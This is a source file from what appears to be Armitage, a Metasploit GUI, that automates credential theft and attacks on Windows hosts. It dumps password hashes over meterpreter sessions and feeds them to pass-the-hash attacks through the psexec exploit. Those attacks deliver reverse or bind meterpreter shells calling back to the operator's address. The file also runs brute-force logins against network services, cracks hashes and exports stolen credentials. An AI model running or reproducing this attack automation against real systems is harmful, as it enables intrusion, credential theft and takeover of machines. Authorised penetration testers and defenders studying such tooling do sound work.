#
# pass the hash attack gets its own file.
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;
import ui.*;

%handlers["hashdump"] = {
	this('$host $safe $queue');

	if ($0 eq "begin" && "*Unknown command*hashdump*" iswm $2) {
		$host = $null;

		if ($safe is $null) {
			$safe = 1;
			m_cmd($1, "use priv");
			m_cmd($1, "hashdump");
		}
		else {
			showError("hashdump is not available here");
			$safe = $null;
		}
	}
	else if ($0 eq "execute") {
		$host = sessionToHost($1);
		$queue = [new armitage.ConsoleQueue: $client];
		[$queue start];
		elog("dumped hashes on $host");
		showError("Dumping Hashes.\nUse View -> Credentials to see them.");
	}
	else if ($0 eq "update" && $host !is $null && $2 ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
		local('$user $gid $hash');
		($user, $gid, $hash) = matched();

		# strip any funky characters that will cause this call to throw an exception
		$user = replace($user, '\P{Graph}', "");
		$hash = fixPass($hash);

		[$queue addCommand: $null, "creds -a $host -p 445 -t smb_hash -u $user -P $hash"];
	}
	else if ($0 eq "end" && ("*Error running*" iswm $2 || "*Operation failed*" iswm $2)) {
		[$queue stop];
		showError("Hash dump failed. Ask yourself:\n\n1) Do I have system privileges?\n\nNo? Then use Access -> Escalate Privileges\n\n2) Is meterpreter running in a process owned\nby a System user?\n\nNo? Use Explore -> Show Processes and migrate\nto a process owned by a System user.");
		$host = $null;
	}
	else if ($0 eq "end" && $host !is $null) {
		[$queue stop];
	}
};

sub refreshCredsTable {
	thread(lambda({
		[Thread yield];
		local('$creds $cred');
		[$model clear: 128];
		$creds = call($mclient, "db.creds2", [new HashMap])["creds2"];
		foreach $cred ($creds) {
			if ($title ne "login" || $cred['ptype'] ne "smb_hash") {
				[$model addEntry: $cred];
			}
		}
		[$model fireListeners];
	}, $model => $1, $title => $2));
}

sub show_hashes {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $scroll');	

	$dialog = dialog($1, 480, $2);

        $model = [new GenericTableModel: @("user", "pass", "host"), "user", 128];
 	
        $table = [new ATable: $model];
        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$sorter setComparator: 2, &compareHosts];
        [$table setRowSorter: $sorter];

	refreshCredsTable($model, $1);

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: 480, 130]];
	[$dialog add: $scroll, [BorderLayout CENTER]];

	return @($dialog, $table, $model);
}

sub createCredentialsTab {
	local('$dialog $table $model $panel $export $crack $refresh');
	($dialog, $table, $model) = show_hashes("", 320);
	[$dialog removeAll];

	addMouseListener($table, lambda({
		if ([$1 isPopupTrigger]) {
			local('$popup $entries');
			$popup = [new JPopupMenu];
			$entries = [$model getSelectedValuesFromColumns: $table, @("user", "pass", "host")];
			item($popup, "Delete", 'D', lambda({
				local('$queue $entry $user $pass $host');
				$queue = [new armitage.ConsoleQueue: $client];
				foreach $entry ($entries) {
					($user, $pass, $host) = $entry;
					$pass = fixPass($pass);
					[$queue addCommand: $null, "creds -d $host -u $user -P $pass"];
				}

				[$queue addCommand: "x", "creds -h"];

				[$queue addListener: lambda({
					[$queue stop];
					refreshCredsTable($model, $null);
				}, \$model, \$queue)];

				[$queue start];
				[$queue stop];
			}, \$table, \$model, \$entries));
			[$popup show: [$1 getSource], [$1 getX], [$1 getY]];
		}
	}, \$table, \$model));

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];
	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		refreshCredsTable($model, $null);
	}, \$model)];

	$crack = [new JButton: "Crack Passwords"];
	[$crack addActionListener: {
		thread({
			launch_dialog("Crack Passwords", "auxiliary", "analyze/jtr_crack_fast", 1);
		});
	}];

	$export = [new JButton: "Export"];
	[$export addActionListener: {
		if ($client !is $mclient) {
			cmd_safe("db_export -f pwdump -a creds.export", {
				thread({
					downloadFile("creds.export", saveFile2());
				});
			});
		}
		else {
			local('$file');
			$file = saveFile2();
			$file = strrep($file, '\\', '\\\\');
			cmd_safe("db_export -f pwdump -a $file", {
				showError("Saved credentials");
			});
		}
	}];

	[$panel add: center($refresh, $crack, $export), [BorderLayout SOUTH]];
	[$frame addTab: "Credentials", $panel, $null];
}

sub pass_the_hash {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');	

	($dialog, $table, $model) = show_hashes("Pass the Hash", 360);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	#[$bottom setLayout: [new GridLayout: 4, 1]];
	[$bottom setLayout: [new BoxLayout: $bottom, [BoxLayout Y_AXIS]]];

	$user = [new ATextField: 32];
	$pass = [new ATextField: 32];
	$domain = [new ATextField: 32];
	[$domain setText: "WORKGROUP"];
	$brute = [new JCheckBox: "Check all credentials"];

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	$reverse = [new JCheckBox: "Use reverse connection"];

	@controls = @($user, $pass, $reverse);

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: label_for("Domain", 75, $domain)];
	[$bottom add: left($brute)];
	[$bottom add: left($reverse)];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["SMBDomain"] = [$domain getText];
		%options['RPORT']     = "445";
		
		if ([$brute isSelected]) {
			%options["RHOSTS"] = join(", ", $hosts);
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]), "smb_hash");
			elog("brute force smb @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/smb/smb_login", %options, "brute smb");
		}
		else {
			%options["SMBUser"] = [$user getText];
			%options["SMBPass"] = [$pass getText];
			%options["LPORT"] = randomPort();

			foreach $host ($hosts) {
				if ([$reverse isSelected]) {
					%options["LHOST"] = $MY_ADDRESS;
					%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
					%options["LPORT"] = randomPort();
				}
				else if (isIPv6($host)) {
					%options["PAYLOAD"] = "windows/meterpreter/bind_ipv6_tcp";
				}
				else {
					%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
				}
				%options["RHOST"] = $host;
				module_execute("exploit", "windows/smb/psexec", copy(%options));
			}
			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
		}

		if (!isShift($1)) {
			[$dialog setVisible: 0];
		}
	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}


sub show_login_dialog {
	local('$port $srvc');
	($port, $srvc) = values($service, @("port", "name"));

	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls $scroll');

	($dialog, $table, $model) = show_hashes("login", 320);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	[$bottom setLayout: [new GridLayout: 3, 1]];

	$user = [new ATextField: 32];
	$pass = [new ATextField: 32];
	$brute = [new JCheckBox: "Check all credentials"];
	@controls = @($user, $pass);

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: $brute];

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["RHOSTS"] = join(', ', $hosts);
		%options["RPORT"] = $port;
		if ([$brute isSelected]) {
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]));
			elog("brute force $srvc @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options, "brute $srvc");
		}
		else {
			%options["USERNAME"] = [$user getText];
			%options["PASSWORD"] = [$pass getText];
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			warn("$srvc $+ : $port => " . %options);
			elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
			module_execute("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
		}
		if (!isShift($1)) {
			[$dialog setVisible: 0];
		}
	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port, \$brute, \$model)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: 480, 130]];
	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createUserPassFile {
	local('$handle $user $pass $type $row $2 $name %entries');
	$name = "userpass" . rand(10000) . ".txt";

	# loop through our entries and store them
	%entries = ohash();
	foreach $row ($1) {
		($user, $pass, $type) = values($row, @("user", "pass", "ptype"));
		if ($type eq "password" || $type eq $2) {
			%entries["$user $pass"] = "$user $pass";
		}
		else {
			%entries[$user] = $user;
		}
	}	

	# print out unique entry values
	$handle = openf("> $+ $name");
	printAll($handle, values(%entries));
	closef($handle);

	if ($client !is $mclient) {
		local('$file');
		$file = uploadFile($name);
		deleteOnExit($name);
		return $file;
	}
	else {
		return getFileProper($name);
	}
}

# launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
sub launchBruteForce {
	thread(lambda({ 
		local('$console $key $value');
		$console = createDisplayTab("$title", $host => "all", $file => "brute_login");
		[$console addCommand: $null, "use $type $+ / $+ $module"];
		foreach $key => $value ($options) {
			$value = strrep($value, '\\', '\\\\');
		}
		$options['REMOVE_USERPASS_FILE'] = "true";
		[$console setOptions: $options];
		[$console addCommand: $null, "run -j"];
		[$console start];
	}, $type => $1, $module => $2, $options => $3, $title => $4));
}
